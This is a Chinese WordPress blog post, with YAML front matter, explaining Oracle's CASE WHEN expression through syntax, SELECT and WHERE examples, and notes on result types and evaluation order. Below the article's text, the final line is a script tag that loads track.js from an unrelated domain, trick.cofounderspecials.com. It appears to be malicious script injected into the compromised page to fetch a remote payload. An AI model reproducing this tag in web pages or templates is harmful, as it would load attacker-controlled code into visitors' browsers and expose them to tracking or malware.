---
id: 19
title: 'case when 在oracle中的运用'
date: '2019-11-14T11:50:58+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=19'
permalink: /index.php/2019/11/14/case-when-%e5%9c%a8oracle%e4%b8%ad%e7%9a%84%e8%bf%90%e7%94%a8/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Oracle
---

case when的语法

**case when 表达式是一个通用条件的表达式，可以在表达式有效的任何位置使用。**

CASE  
WHEN <A> THEN <somethingA>  
WHEN <B> THEN  
<somethingB>  
ELSE  
<somethingE>  
END

1、case when 用在select语句中

SELECT a, CASE WHEN a=1 THEN 'one'  
WHEN a=2 THEN 'two'  
ELSE 'other' END  
FROM test;

2、case when 用在where语句中

SELECT \* FROM tbname t WHERE 1=1  
AND (CASE WHEN t.vc\_state = '2' THEN t.vc\_userId ELSE 当前登录人id END ) = 当前登录人id

注意  
1.result表示关联条件为真时返回的值，所以无论有多少个when子句，其result都必须的同一个类型的值，因为一个关系型数据库字段只能有一种类型（含括else可能返回的结果）  
2.condition “如果为false，则以相同的方式评估后续where子句”即如果为真，就按照这种方式返回结果result，相当于是有先后顺序的

 <script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>